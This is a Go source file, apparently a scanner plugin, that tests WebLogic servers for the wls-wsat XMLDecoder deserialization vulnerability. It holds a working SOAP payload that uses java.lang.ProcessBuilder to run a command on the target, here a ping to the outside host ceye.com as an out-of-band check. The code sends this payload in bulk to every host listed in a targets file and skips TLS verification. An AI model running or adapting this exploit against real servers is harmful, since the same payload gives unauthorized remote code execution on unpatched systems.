package Plugins

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"github.com/parnurzeal/gorequest"
	"os"
	"regexp"
	"strings"
	"time"
)

const (
	postStr = `<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java>
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="2">
<void index="0">
<string>/usr/sbin/ping</string>
</void>
<void index="1">
<string>ceye.com</string>
</void>
</array>
<void method="start"/>
</void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>`
)

func poc10271(u string) (int, string) {
	url := "http://" + u + "/wls-wsat/CoordinatorPortType"
	request := gorequest.New()
	request.TLSClientConfig(&tls.Config{InsecureSkipVerify: true}) // Skip SSL certificate verification
	_, body, errs := request.Post(url).
		SendString(postStr).
		Set("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8").
		Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299").
		Set("Content-Type", "text/xml").
		Timeout(3 * time.Second).
		End()
	if len(errs) > 0 {
		return 0, fmt.Sprintf("[-] [%s] Error occurred while sending request: %v", u, errs[0])
	}

	response := strings.TrimSpace(body)
	pattern := `<faultstring>.*</faultstring>`
	re := regexp.MustCompile(pattern)
	match := re.FindString(response)
	if strings.Contains(match, "java.lang.ProcessBuilder") || strings.Contains(match, "<faultstring>0") {
		return 1, fmt.Sprintf("[+] 存在漏洞 %s ", VUL[4])
	} else {
		return 0, fmt.Sprintf("[-] 已扫描 %s ", VUL[4])
	}
}

func run10271(rip string, rport int) (int, string) {
	url := fmt.Sprintf("%s:%d", rip, rport)
	return poc10271(url)
}

func Check10271() {
	filePath := "targets.txt"

	file, err := os.Open(filePath)
	if err != nil {
		fmt.Printf("无法打开文件：%s\n", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			parts := strings.Split(line, ":")
			if len(parts) != 2 {
				fmt.Printf("无效的目标格式：%s\n", line)
				continue
			}

			targetHost := parts[0]
			targetPort := parts[1]

			// 将端口转换为整数
			var portInt int
			_, err := fmt.Sscanf(targetPort, "%d", &portInt)
			if err != nil {
				fmt.Printf("无效的端口：%s\n", targetPort)
				continue
			}
			_, result := run10271(targetHost, portInt)
			fmt.Println(result)
		}
	}
}
